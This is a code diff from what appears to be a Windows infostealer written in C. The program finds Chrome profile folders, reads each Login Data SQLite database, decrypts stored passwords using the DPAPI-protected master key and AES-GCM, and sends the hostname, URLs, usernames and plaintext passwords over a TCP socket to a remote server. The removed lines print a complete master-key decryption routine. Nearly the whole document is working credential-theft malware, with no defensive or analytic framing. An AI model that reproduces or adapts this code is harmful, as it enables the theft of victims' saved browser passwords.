@@ -40,9 +40,6 @@
 CHAR tcp_send_buffer[DEFAULT_BUFLEN];
 SOCKET ConnectSocket = INVALID_SOCKET;
 
-BOOL connect(SOCKET* ConnectSocket, PCSTR server_ip, PCSTR server_port);
-
-//BOOL decrypt_masterkey(PWCHAR enc_master_key, BCRYPT_KEY_HANDLE* handle_bcrypt);
 BOOL get_file_handle(PSTR chrome_dir, WIN32_FIND_DATAA* dir_files, HANDLE* dir_handle);
 BOOL is_substring_in(const CHAR* substring, PCHAR test_string);
 BOOL open_database_conn(PSTR chrome_dir_char, PSTR profile_name, sqlite3** handle_db);
@@ -54,13 +51,6 @@ void closeConnection();
 
 //int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
 int main() {
-	/* These variables are used to retrieve chrome paths, directories, master key etc. */
-	WCHAR chrome_dir[MAX_PATH] = { L'\0' };													// Buffer to hold Google Chrome directory
-	CHAR chrome_dir_char[MAX_PATH] = { '\0' };												// Chrome directory in CHAR (Later it will be used to get profile paths to get Login Data db
-	
-	WIN32_FIND_DATAA dir_files;																// Handle to get file/folders on Chrome_dir
-	HANDLE dir_handle;																		// Handle to a directory/file
-
 	/* These variables are used to handle the database of chrome, which is Login Data */
 	sqlite3* handle_db;																		// Handle to SQLite Database handle
 	sqlite3_stmt* sql_stmt;																	// Handle to SQLite Query Statement
@@ -71,40 +61,11 @@ int main() {
 		return FALSE;
 	}
 
-	// Get computer name and send it
-	DWORD len_machine_name = MAX_COMPUTERNAME_LENGTH + 1;
-	CHAR machine_name[MAX_COMPUTERNAME_LENGTH + 1];
-	if (GetComputerNameA(machine_name, &len_machine_name) == 0)
-		sprintf_s(machine_name, len_machine_name, "<error-getting-hostname>");
-	sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "-------- GOT CONNECTION FROM (%s) --------\n", machine_name);
-	sendData(tcp_send_buffer);
-
-	/* These are used to decrypt the passwords in database */
-	BYTE* data_blob;																		// Variable to hold the retrieved bytes of encrypted password (Which contains password version, IV, cipher text and the tag)
-	int data_blob_size;																		// To hold the size of bytes of the encrypted password
-	ULONG decrypted_credential_size = CIPHER_LEN, default_cipher_text_size = CIPHER_LEN;	// To hold the size of cipher text and the decrypted password size
-	BYTE* cipher_text_byte = (BYTE*)malloc(default_cipher_text_size);						// Allocate a buffer to hold the cipher text (actual encrypted password)
-	if (!cipher_text_byte) {
-		Debug(sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "malloc: Error when allocating buffer for 'cipher_text_byte'\n");)
-		Debug(send(tcp_send_buffer, ConnectSocket);)
-		return FALSE;
-	}
-	memset(cipher_text_byte, 0, default_cipher_text_size);
-	BYTE* tmp_cipher_text_byte;																// Temporary pointer in case if the size of the cipher text buffer is not enough, (to reallocate)
-	BYTE* decrypted_credential = (BYTE*)malloc(decrypted_credential_size);					// Allocate a buffer to hold the decrypted password in byte form
-	if (!decrypted_credential) {
-		Debug(sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "malloc: Error when allocating buffer for 'decrypted_credential'\n");)
-		Debug(send(tcp_send_buffer, ConnectSocket);)
-		return FALSE;
-	}
-	memset(decrypted_credential, 0, decrypted_credential_size);
-	BYTE iv[IV_LEN] = { 0 }, tag[TAG_LEN] = { 0 };											// Buffers to hold IV and the TAG. Which are used to decrypt the cipher text.
-
-
-
+	send_machineName(ConnectSocket);
 
 	/* Gets the Chrome Folder if exists, which is% LOCALAPPDATA% \Google\Chrome\User Data */
-	if (!get_browser_dir(FOLDERID_LocalAppData, L"\\Google\\Chrome\\User Data\\", chrome_dir, tcp_send_buffer, DEFAULT_BUFLEN)) {
+	WCHAR chrome_dir[MAX_PATH] = { L'\0' };													// Buffer to hold Google Chrome directory
+	if (!get_user_dir(FOLDERID_LocalAppData, L"\\Google\\Chrome\\User Data\\", chrome_dir, tcp_send_buffer, DEFAULT_BUFLEN)) {
 		Debug(sendData(tcp_send_buffer);)
 		exit(1);
 	}
@@ -114,9 +75,6 @@ int main() {
 		Debug(sendData(tcp_send_buffer);)
 		exit(1);
 	}
-
-
-
 	/* Decrypts the Master keyand returns a AES - GCM decrypting algorithm to decrypt passwords. */
 	BCRYPT_KEY_HANDLE handle_bcrypt;													// Handle to the decryption algorithm of AES-GCM256
 	CHAR char_master_key[ENC_MASTER_KEY_LEN];											// Buffer to hold encrypted BASE64 encoded char type master key
@@ -137,20 +95,43 @@ int main() {
 	/* Converts the WCHAR chrome directory path to CHAR */
 	size_t size_returned_char_master_key;
 	errno_t err;
+	CHAR chrome_dir_char[MAX_PATH] = { '\0' };												// Chrome directory in CHAR, used to get profile paths to get Login Data db
 	if ((err = wcstombs_s(&size_returned_char_master_key, chrome_dir_char, MAX_PATH * sizeof(CHAR), chrome_dir, (MAX_PATH - 1) * sizeof(CHAR)))) {
 		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "wcstombs_s: Error when converting wchar master key to char master key, error: %d\n", err);
 		sendData(tcp_send_buffer);
 		exit(1);
 	}
 	/* Gets a file handle for Chrome directory to list the files in that directory */
+	WIN32_FIND_DATAA dir_files;																// Handle to get file/folders on Chrome_dir
+	HANDLE dir_handle;																		// Handle to a directory/file
 	if (!get_file_handle(chrome_dir_char, &dir_files, &dir_handle)) {
 		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "Getting Chrome Directory file handle failed\n");
 		sendData(tcp_send_buffer);
 		exit(1);
 	}
+
+	/* These are used to decrypt the passwords in database */
+	ULONG decrypted_credential_size = CIPHER_LEN, default_cipher_text_size = CIPHER_LEN;	// To hold the size of cipher text and the decrypted password size
+	BYTE* cipher_text_byte = (BYTE*)malloc(default_cipher_text_size);						// Allocate a buffer to hold the cipher text (actual encrypted password)
+	if (!cipher_text_byte) {
+		Debug(sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "malloc: Error when allocating buffer for 'cipher_text_byte'\n");)
+		Debug(send(tcp_send_buffer, ConnectSocket);)
+		return FALSE;
+	}
+	memset(cipher_text_byte, 0, default_cipher_text_size);
+	
+	BYTE* decrypted_credential = (BYTE*)malloc(decrypted_credential_size);					// Allocate a buffer to hold the decrypted password in byte form
+	if (!decrypted_credential) {
+		Debug(sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "malloc: Error when allocating buffer for 'decrypted_credential'\n");)
+		Debug(send(tcp_send_buffer, ConnectSocket);)
+		return FALSE;
+	}
+	memset(decrypted_credential, 0, decrypted_credential_size);
+	
+
 	/* Go through the files/folders in that directory */
 	do {
-		if (is_substring_in("Default", dir_files.cFileName) || is_substring_in("Profile", dir_files.cFileName)) {	// Check if a folder starts with "Deafult" or "Profile \d?" to identify profile directories
+		if (checkSubtring("Default", dir_files.cFileName) || checkSubtring("Profile", dir_files.cFileName)) {	// Check if a folder starts with "Deafult" or "Profile \d?" to identify profile directories
 
 			sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "------------------------ %s ------------------------\n", dir_files.cFileName);
 			sendData(tcp_send_buffer);
@@ -171,18 +152,18 @@ int main() {
 
 			/* Ietrate over results one by one */
 			while ((status = sqlite3_step(sql_stmt)) == SQLITE_ROW) {
-				sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "URL: %s\n", sqlite3_column_text(sql_stmt, 0));
-				sendData(tcp_send_buffer);
-				sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "Username: %s\n", sqlite3_column_text(sql_stmt, 1));
+				sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "URL: %s\nUsername: %s\n", sqlite3_column_text(sql_stmt, 0), sqlite3_column_text(sql_stmt, 1));
 				sendData(tcp_send_buffer);
 
 				/* Gets the size of the data_blob, which is the encrypted credentials */
-				data_blob_size = sqlite3_column_bytes(sql_stmt, 2);
+				int data_blob_size = sqlite3_column_bytes(sql_stmt, 2); // To hold the size of bytes of the encrypted password
 
 				/* Gets the data_blob to buffer */
-				data_blob = (BYTE*)sqlite3_column_blob(sql_stmt, 2);
+				BYTE* data_blob = (BYTE*)sqlite3_column_blob(sql_stmt, 2);	// Variable to hold the retrieved bytes of encrypted password (Which contains password version, IV, cipher text and the tag)
 
 				/* Decrypt password */
+				BYTE* tmp_cipher_text_byte;																// Temporary pointer in case if the size of the cipher text buffer is not enough, (to reallocate)
+				BYTE iv[IV_LEN] = { 0 }, tag[TAG_LEN] = { 0 };											// Buffers to hold IV and the TAG. Which are used to decrypt the cipher text.
 				if (!get_credentials(handle_bcrypt, &data_blob, &data_blob_size, &cipher_text_byte, &default_cipher_text_size, iv, tag, &tmp_cipher_text_byte, &decrypted_credential, &decrypted_credential_size)) {
 					sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "Getting decrypted password error\n");
 					sendData(tcp_send_buffer);
@@ -228,97 +209,6 @@ int main() {
 	return 0;
 }
 
-BOOL decrypt_masterkey(PWCHAR enc_master_key, BCRYPT_KEY_HANDLE* p_handle_key) {
-	CHAR char_master_key[ENC_MASTER_KEY_LEN];											// Buffer to hold encrypted BASE64 encoded char type master key
-	size_t size_returned_char_master_key;												// To hold resulting bytes after converting WCHAR Base64 encoded encrypted master key to CHAR
-	DWORD size_byte_master_key = NULL, bytesDone = 0;									// To hold size of byte form master key, to hold how many bytes used by Bcrypt 
-	BCRYPT_ALG_HANDLE handle_bcrypt_algorithm;											// Handle to Bcrypt ALG algorithm provider
-	DATA_BLOB blob_enc_masterkey, blob_dec_masterkey;									// DATA_BLOBs to hold byte form of encrypted and decrypted master keys
-	errno_t err;
-	NTSTATUS bcryptStatus = 0;
-
-	/*
-	Master key in the 'Local State' file is encoded in Base64, after decoding it into byte form, there will be 5 bytes of 'DPAPI' string to identify
-	the encryption type of the Master key, DPAPI is the API provided by Windows to protect data (using CryptProtectData()). So 'DPAPI' is removed and then
-	rest of the bytes are decrypted using CryptUnProtectData() funciton. And then
-	*/
-	/* Convert WCHAR form of Base64 encoded master key to CHAR */
-	if ((err = wcstombs_s(&size_returned_char_master_key, char_master_key, ENC_MASTER_KEY_LEN * sizeof(CHAR), enc_master_key, (ENC_MASTER_KEY_LEN - 1) * sizeof(CHAR)))) {
-		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "wcstombs_s: Error when converting wchar master key to char master key, error: %d\n", err);
-		sendData(tcp_send_buffer);
-		return FALSE;
-	}
-	/* To Convert CHAR form of Base64 encoded master key to Byte form, the resulting buffer size is needed, so 'size_byte_master_key' is passed to get that value */
-	if (!(CryptStringToBinaryA(char_master_key, 0, CRYPT_STRING_BASE64, NULL, &size_byte_master_key, NULL, NULL))) {
-		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "CryptStringToBinaryA: Error when getting size of the buffer to hold byte master key, error: %d\n", err);
-		sendData(tcp_send_buffer);
-		return FALSE;
-	}
-	/* Using above 'size_byte_master_key', a buffer is created to hold Byte form of Base64 encoded master key */
-	BYTE* byte_master_key = (BYTE*)malloc(size_byte_master_key);
-	if (!byte_master_key) {
-		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "malloc: Error when allocating memory for byte master key\n");
-		sendData(tcp_send_buffer);
-		return FALSE;
-	}
-	/* Convert Base64 encoded master key into byte form */
-	if (!(CryptStringToBinaryA(char_master_key, 0, CRYPT_STRING_BASE64, byte_master_key, &size_byte_master_key, NULL, NULL))) {
-		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "CryptStringToBinaryA: Error when converting and placing byte master key, error: %d\n", err);
-		sendData(tcp_send_buffer);
-		return FALSE;
-	}
-	/* Move the bytes in 'byte_master_key' to left by 5 bytes. So the bytes of 'DPAPI' will be overwritten. */
-	memmove(byte_master_key, byte_master_key + 5, size_byte_master_key);
-	/* Then the resulting bytes will be placed on 'DATA_BLOB' structure to Decrypt it using CryptUnProtectData(), then it will be decrypted and decrypted and resulting data will be placed on 'blob_dec_masterkey'*/
-	blob_enc_masterkey.cbData = size_byte_master_key - 5;
-	blob_enc_masterkey.pbData = byte_master_key;
-	if (!(CryptUnprotectData(&blob_enc_masterkey, NULL, NULL, NULL, NULL, 0, &blob_dec_masterkey))) {
-		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "CryptUnprotectData: Master key decryption failed.\n");
-		sendData(tcp_send_buffer);
-		return FALSE;
-	}
-
-	/*
-	Chrome passwords are encrypted using AES-256-GCM encrypting algorithm (symetric). So Decrypting algorithm provider is opened and the returned resulting handle to actully
-	decrypt passwords using that handle.
-	*/
-	bcryptStatus = BCryptOpenAlgorithmProvider(&handle_bcrypt_algorithm, BCRYPT_AES_ALGORITHM, 0, 0);
-	if (!BCRYPT_SUCCESS(bcryptStatus)) {
-		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "BCryptOpenAlgorithmProvider: Error getting BCrypt handle, error: %ld\n", bcryptStatus);
-		sendData(tcp_send_buffer);
-		return FALSE;
-	}
-	bcryptStatus = BCryptSetProperty(handle_bcrypt_algorithm, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
-	if (!BCRYPT_SUCCESS(bcryptStatus)) {
-		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "BCryptSetProperty: Error setting BCrypt handle, error: %ld\n", bcryptStatus);
-		sendData(tcp_send_buffer);
-		return FALSE;
-	}
-	BCRYPT_AUTH_TAG_LENGTHS_STRUCT authTagLengths;
-	bcryptStatus = BCryptGetProperty(handle_bcrypt_algorithm, BCRYPT_AUTH_TAG_LENGTH, (BYTE*)&authTagLengths, sizeof(authTagLengths), &bytesDone, 0);
-	if (!BCRYPT_SUCCESS(bcryptStatus)) {
-		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "BCryptGetProperty: Error getting BCrypt handle, BCRYPT_AUTH_TAG_LENGTH, error: %ld\n", bcryptStatus);
-		sendData(tcp_send_buffer);
-		return FALSE;
-	}
-	DWORD blockLength = 0;
-	bcryptStatus = BCryptGetProperty(handle_bcrypt_algorithm, BCRYPT_BLOCK_LENGTH, (BYTE*)&blockLength, sizeof(blockLength), &bytesDone, 0);
-	if (!BCRYPT_SUCCESS(bcryptStatus)) {
-		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "BCryptGetProperty: Error getting BCrypt handle, BCRYPT_BLOCK_LENGTH, error: %ld\n", bcryptStatus);
-		sendData(tcp_send_buffer);
-		return FALSE;
-	}
-	bcryptStatus = BCryptGenerateSymmetricKey(handle_bcrypt_algorithm, p_handle_key, 0, 0, blob_dec_masterkey.pbData, blob_dec_masterkey.cbData, 0);
-	if (!BCRYPT_SUCCESS(bcryptStatus)) {
-		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "BCryptGenerateSymmetricKey: Error generating Symetric key, error: %ld\n", bcryptStatus);
-		sendData(tcp_send_buffer);
-		return FALSE;
-	}
-
-	free(byte_master_key);
-	return TRUE;
-}
-
 BOOL get_file_handle(PSTR chrome_dir, WIN32_FIND_DATAA* dir_files, HANDLE* dir_handle) {
 	errno_t err;
 
@@ -332,7 +222,7 @@ BOOL get_file_handle(PSTR chrome_dir, WIN32_FIND_DATAA* dir_files, HANDLE* dir_h
 	/* Gets the first file/folder handle in the directory, and set it to 'dir_handle' */
 	*dir_handle = FindFirstFileA(chrome_dir, dir_files);
 	if (dir_handle == INVALID_HANDLE_VALUE) {
-		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "Getting sub directories error: %d\n", GetLastError());
+		sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "Getting sub directories error: %lu\n", GetLastError());
 		sendData(tcp_send_buffer);
 		return FALSE;
 	}
@@ -341,17 +231,6 @@ BOOL get_file_handle(PSTR chrome_dir, WIN32_FIND_DATAA* dir_files, HANDLE* dir_h
 	memset(chrome_dir + lstrlenA(chrome_dir) - 2, '\0', 2);
 
 	return TRUE;
-}
-
-BOOL is_substring_in(const CHAR* substring, PCHAR test_string) {
-	int i = 0;
-	if (lstrlenA(substring) <= lstrlenA(test_string)) {
-		for (i = 0; i < lstrlenA(substring); i++) {
-			if (substring[i] != test_string[i]) return FALSE;
-		}
-		return TRUE;
-	}
-	return FALSE;
 }
 
 BOOL decrypt_password(BCRYPT_KEY_HANDLE handle_bcrypt, BYTE* cipher_text, ULONG size_cipher_text, BYTE* iv, ULONG size_iv, BYTE* tag, ULONG size_tag, BYTE** decrypted_credentials, ULONG* size_decrypted_credentials) {
